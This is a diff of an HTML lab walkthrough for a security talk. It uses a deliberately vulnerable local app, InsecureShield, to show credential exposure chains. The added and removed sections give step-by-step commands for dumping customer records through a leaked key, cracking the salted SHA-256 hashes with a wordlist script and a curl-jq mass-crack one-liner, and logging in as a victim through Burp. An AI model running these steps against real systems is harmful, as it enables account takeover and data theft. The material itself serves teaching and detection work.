@@ -213,7 +213,7 @@
 <body>
 
 <h1>InsecureShield — Reproduce the Talk at Home <span class="accent">↻</span></h1>
-<p class="subtitle">A step-by-step walkthrough of three production-grade credential exposure chains.<br>
+<p class="subtitle">A step-by-step walkthrough of two production-grade credential exposure chains.<br>
 30 minutes from clone to "I saw it with my own eyes."</p>
 
 <div class="meta-strip">
@@ -228,9 +228,8 @@
 <div class="quick-nav">
   <strong>What you'll do in the next 30 minutes</strong>
   ① Clone and run InsecureShield (5 min) ·
-  ② Chain 1 — Azure AD credentials in <code>main.js</code> → 4,999 customer records (10 min) ·
-  ③ Chain 2 — encrypted blob decrypted with <code>decrypt.py</code> → superadmin token → DB connection string (8 min) ·
-  ④ Chain 3 — captured password hash cracked with <code>crack.py</code> → log in as the customer (7 min)
+  ② Chain 1 — Azure AD credentials in <code>main.js</code> → 4,999 customer records → hash-crack → log in as the customer (15 min) ·
+  ③ Chain 2 — encrypted blob decrypted with <code>decrypt.py</code> → superadmin token → DB connection string (10 min)
 </div>
 
 <!-- =========================== SECTION 1 ============================ -->
@@ -339,7 +338,7 @@ Host: localhost:3000
 Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9....
 Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 
-<p><strong>Expected response:</strong> 4,999 customer records. For each customer: <code>id</code>, <code>name</code>, <code>email</code>, <code>dob</code>, <code>phone</code>, <code>ssn</code>, <code>address</code>, plus a <code>passwordHash</code> and <code>salt</code> (Chain 3 uses these).</p>
+<p><strong>Expected response:</strong> 4,999 customer records. For each customer: <code>id</code>, <code>name</code>, <code>email</code>, <code>dob</code>, <code>phone</code>, <code>ssn</code>, <code>address</code>, plus a <code>passwordHash</code> and <code>salt</code> (steps 2.6 &ndash; 2.8 use these).</p>
 
 <p><strong>Quick negative check.</strong> Drop either header and resend — the server returns <strong>401</strong> in both cases. That's the gateway requiring both credentials to be valid.</p>
 
@@ -361,6 +360,57 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 }</pre>
 
 <div class="callout why"><strong>Punchline read aloud:</strong> "<em>$417,350 in claims exposure across 4,999 customers — from a key the JavaScript handed me.</em>"</div>
+
+<h3><span class="step">2.6</span>Post-exfil impact — the response is also a credential dump</h3>
+
+<p>The <code>/api/users</code> response from step 2.4 didn't just leak names and emails. Every record carried a <code>passwordHash</code> and a <code>salt</code>. That makes the response a <em>credential dump</em> &mdash; and credential dumps fuel account takeover. The hashing scheme is visible in <code>data/db.js</code>:</p>
+
+<pre>const salt = crypto.createHash('md5').update(c.id + ':salt').digest('hex').slice(0, 16);
+const hash = crypto.createHash('sha256').update(c.password + salt).digest('hex').toUpperCase();</pre>
+
+<p>Format: <code>SHA-256(password + salt)</code>, uppercase hex. A pentester would identify this from the hash shape alone (64 hex chars = 256 bits = SHA-256). Hashcat mode <code>1410</code> fits exactly.</p>
+
+<h3><span class="step">2.7</span>Reverse the captured hash with <code>crack.py</code></h3>
+
+<p>The companion <code>crack.py</code> reads <code>HASH:SALT</code> on stdin and tries every entry in <code>wordlist.txt</code> (51 realistic patterns &mdash; <code>password</code>, <code>Pass@1234</code>, <code>P@ssw0rd</code>, <code>Welcome2024</code>, &hellip;):</p>
+
+<pre>echo 'C123F6BF928BA0182E22850B0D3A56731620D94E493D1741F50BC66C0EFC0A91:cb590adac3c2f4af' \
+  | python3 crack.py</pre>
+
+<p><strong>Expected output</strong> (instant &mdash; under 100ms on any laptop):</p>
+
+<pre>C123F6BF928BA018&hellip;  &rarr;  Pass@1234</pre>
+
+<div class="callouts">
+  <div class="callout find"><strong>What you'll find</strong>The captured hash for James Mitchell (<code>CUST-001</code>) cracks to <code>Pass@1234</code>. Mass crack: pipe all 4,999 <code>HASH:SALT</code> pairs from the response through <code>crack.py</code> and watch every weak password fall.</div>
+  <div class="callout why"><strong>Why it matters</strong>The hashing is technically "salted" &mdash; but salts only defeat rainbow tables, not per-account dictionary attacks. A 51-line wordlist cracks every common password instantly. Real rockyou.txt has 14M entries.</div>
+  <div class="callout notool"><strong>Without tools</strong>Replace <code>crack.py</code> with three lines of Python plus a wordlist, or use hashcat <code>-m 1410</code> with rockyou.txt &mdash; same flow, different tooling.</div>
+  <div class="callout tool"><strong>Mass-crack one-liner</strong>Pipe the API response through <code>jq</code>:<br><code>curl &hellip; /api/users | jq -r '.users[] | "\(.passwordHash):\(.salt)"' | python3 crack.py</code></div>
+</div>
+
+<h3><span class="step">2.8</span>Log in as the customer &mdash; Burp Repeater</h3>
+
+<p>Cracking a hash is theoretical until you use the password. Stage one more Repeater request:</p>
+
+<pre>POST /api/login HTTP/1.1
+Host: localhost:3000
+Content-Type: application/json
+
+{"email":"james.mitchell@gmail.com","password":"Pass@1234"}</pre>
+
+<p><strong>Expected response:</strong></p>
+
+<pre>{
+  "IsSuccess":  true,
+  "token":     "eyJhbGc...",
+  "role":      "customer",
+  "name":      "James Mitchell",
+  "customerId":"CUST-001"
+}</pre>
+
+<p>The portal just authenticated you as James Mitchell. With that customer JWT (+ the APIM subscription key) you can read his profile, his policies, his claims &mdash; anything the portal exposes for the account.</p>
+
+<div class="callout why"><strong>Chain 1 closing line:</strong> "<em>From a leaked subscription key, to 4,999 hashed credentials, to a plaintext password in a 51-line wordlist, to logged in as the customer &mdash; in under two minutes. No phishing. No social engineering. Just the JavaScript file the browser downloaded.</em>"</div>
 
 <!-- =========================== SECTION 3 ============================ -->
 
@@ -469,78 +519,19 @@ Ocp-Apim-Subscription-Key: a1b2c3d4e5f6789012345678901234ab</pre>
 
 <div class="pagebreak"></div>
 
-<h2><span class="num">4</span>Chain 3 — Crack a captured hash and log in as the customer</h2>
-
-<p>The <code>/api/users</code> response from step 2.4 didn't just leak names and emails. Every record carried a <code>passwordHash</code> and a <code>salt</code>. That makes the response a <em>credential dump</em> — and credential dumps fuel account takeover.</p>
-
-<h3><span class="step">4.1</span>The hashing scheme — discoverable from db.js</h3>
-
-<p>Open <code>data/db.js</code> in the cloned repo. The relevant lines:</p>
-
-<pre>const salt = crypto.createHash('md5').update(c.id + ':salt').digest('hex').slice(0, 16);
-const hash = crypto.createHash('sha256').update(c.password + salt).digest('hex').toUpperCase();</pre>
-
-<p>So the format is <code>SHA-256(password + salt)</code>, uppercase hex. A pentester would identify this from the hash shape alone (64 hex chars = 256 bits = SHA-256) and confirm by trying both <code>password+salt</code> and <code>salt+password</code>. Hashcat mode <code>1410</code> fits exactly.</p>
-
-<h3><span class="step">4.2</span>Reverse the hash with <code>crack.py</code> — one line</h3>
-
-<p>The companion <code>crack.py</code> reads <code>HASH:SALT</code> on stdin and tries every entry in <code>wordlist.txt</code> (51 realistic patterns: <code>password</code>, <code>Pass@1234</code>, <code>P@ssw0rd</code>, <code>Welcome2024</code>, …):</p>
-
-<pre>echo 'C123F6BF928BA0182E22850B0D3A56731620D94E493D1741F50BC66C0EFC0A91:cb590adac3c2f4af' \
-  | python3 crack.py</pre>
-
-<p><strong>Expected output</strong> (instant — under 100ms on any laptop):</p>
-
-<pre>C123F6BF928BA018…  →  Pass@1234</pre>
-
-<div class="callouts">
-  <div class="callout find"><strong>What you'll find</strong>The captured hash for James Mitchell (<code>CUST-001</code>) cracks to the plaintext password <code>Pass@1234</code>. Mass crack: pipe all 4,999 <code>HASH:SALT</code> pairs from the response and watch any password in the wordlist crack.</div>
-  <div class="callout why"><strong>Why it matters</strong>The hashing is technically "salted" — but salts only protect against rainbow tables, not against per-account dictionary attacks. A 51-line wordlist cracks every common password instantly. Real rockyou.txt has 14M entries.</div>
-  <div class="callout notool"><strong>Without tools</strong>Replace <code>crack.py</code> with three lines of Python and a wordlist. Or use hashcat <code>-m 1410</code> with rockyou.txt — the same flow, different tooling.</div>
-  <div class="callout tool"><strong>Mass crack one-liner</strong>Pipe the API response through <code>jq</code> to extract every hash+salt pair, then through <code>crack.py</code>:<br><code>curl … /api/users | jq -r '.users[] | "\(.passwordHash):\(.salt)"' | python3 crack.py</code></div>
-</div>
-
-<h3><span class="step">4.3</span>Log in as the customer — Burp Repeater</h3>
-
-<p>Cracking a hash is theoretical until you use the password. Stage one more Repeater request:</p>
-
-<pre>POST /api/login HTTP/1.1
-Host: localhost:3000
-Content-Type: application/json
-
-{"email":"james.mitchell@gmail.com","password":"Pass@1234"}</pre>
-
-<p><strong>Expected response:</strong></p>
-
-<pre>{
-  "IsSuccess":  true,
-  "token":     "eyJhbGc...",   // customer-scoped JWT
-  "role":      "customer",
-  "name":      "James Mitchell",
-  "customerId":"CUST-001"
-}</pre>
-
-<p>The portal just authenticated you as James Mitchell. With that customer JWT (+ the APIM subscription key) you can read his profile, his policies, his claims — anything the portal exposes for the account.</p>
-
-<div class="callout why"><strong>Punchline read aloud:</strong> "<em>From a leaked subscription key, to 4,999 hashed credentials, to a plaintext password in a 51-line wordlist, to logged in as the customer — in under two minutes. No phishing. No social engineering. Just the JavaScript file the browser downloaded.</em>"</div>
-
-<!-- =========================== SECTION 5 ============================ -->
-
-<div class="pagebreak"></div>
-
-<h2><span class="num">5</span>Additional credentials — where else they hide</h2>
+<h2><span class="num">4</span>Additional credentials — where else they hide</h2>
 
 <p>The three chains aren't the only credentials in the bundle. InsecureShield scatters secrets across several files — each representing a different real-world delivery pattern. Walk these to build the muscle memory for production audits.</p>
 
-<h3><span class="step">5.1</span>/js/env.js — build-time env-var injection</h3>
+<h3><span class="step">4.1</span>/js/env.js — build-time env-var injection</h3>
 <p><strong>Pattern:</strong> Webpack <code>DefinePlugin</code> or <code>NEXT_PUBLIC_*</code> inlining. The developer wrote <code>process.env.STRIPE_SECRET_KEY</code>; the build replaced it with the literal string.</p>
 <p><strong>What you'll find:</strong> Stripe live key, SendGrid key, AWS access key + secret, Stripe webhook secret, Twilio auth token + account SID, <code>INTERNAL_API_KEY</code>, S3 bucket name. Every one of these visible in Burp's response pane on every page load.</p>
 
-<h3><span class="step">5.2</span>/js/firebase.js — Google Cloud service-account leak</h3>
+<h3><span class="step">4.2</span>/js/firebase.js — Google Cloud service-account leak</h3>
 <p><strong>Pattern:</strong> Static config import. The developer literally pasted the Firebase service-account JSON into the client bundle.</p>
 <p><strong>What you'll find:</strong> Google API key, PEM RSA private key, <code>private_key_id</code>, Firebase database URL, service account email, Firebase <code>client_id</code>.</p>
 
-<h3><span class="step">5.3</span>/asset-manifest.json — manifest-file leak</h3>
+<h3><span class="step">4.3</span>/asset-manifest.json — manifest-file leak</h3>
 <p><strong>Pattern:</strong> The build pipeline emits a manifest of asset paths and config. Often overlooked by scanners that focus on <code>.js</code> files.</p>
 <p><strong>What you'll find:</strong> AWS region, S3 bucket name, redundant AWS access key + secret, additional API keys with custom prefixes. The manifest is served with a non-JS content type — many scanners skip it.</p>
 
@@ -548,11 +539,11 @@ Content-Type: application/json
 
 <div class="pagebreak"></div>
 
-<h2><span class="num">6</span>Reproduce the 4-tool comparison</h2>
+<h2><span class="num">5</span>Reproduce the 4-tool comparison</h2>
 
 <p>This is the segment that closes the talk. Same target. Same Burp proxy. Default rules each tool. Compare what each one finds.</p>
 
-<h3><span class="step">6.1</span>Run the four tools against InsecureShield</h3>
+<h3><span class="step">5.1</span>Run the four tools against InsecureShield</h3>
 
 <ul>
   <li><strong>SecretSifter</strong> (Burp extension) — github.com/secretsifter/secretsifter-burp · BApp Store: pending</li>
@@ -563,7 +554,7 @@ Content-Type: application/json
 
 <p>For each Burp extension: proxy InsecureShield through Burp, browse the login + dashboard pages, let the passive scanners run. For TruffleHog CLI: run <code>trufflehog filesystem ./dist</code> against the built artifact.</p>
 
-<h3><span class="step">6.2</span>What to expect</h3>
+<h3><span class="step">5.2</span>What to expect</h3>
 
 <table class="table-comparison">
   <tr><th>Tool</th><th class="count">Unique creds</th><th>Notable wins</th><th>Notable misses</th></tr>
@@ -577,7 +568,7 @@ Content-Type: application/json
 
 <!-- =========================== SECTION 7 ============================ -->
 
-<h2><span class="num">7</span>Add your own detection patterns</h2>
+<h2><span class="num">6</span>Add your own detection patterns</h2>
 
 <p>If you find a credential category that SecretSifter doesn't catch, the patterns are in <code>Patterns.java</code> in the <code>burp-secret-scanner</code> repo. Each pattern is a regex plus a severity, confidence, and label.</p>
 
@@ -594,7 +585,7 @@ new Pattern(
 
 <!-- =========================== SECTION 8 ============================ -->
 
-<h2><span class="num">8</span>What to do with what you found</h2>
+<h2><span class="num">7</span>What to do with what you found</h2>
 
 <p>If you're a <strong>pentester or bug-bounty hunter</strong>: don't stop at "credential exists." Walk the chain. Call the token endpoint. Enumerate what the service principal is permitted to do. The frontend code often documents the backend endpoints you can then call.</p>
 
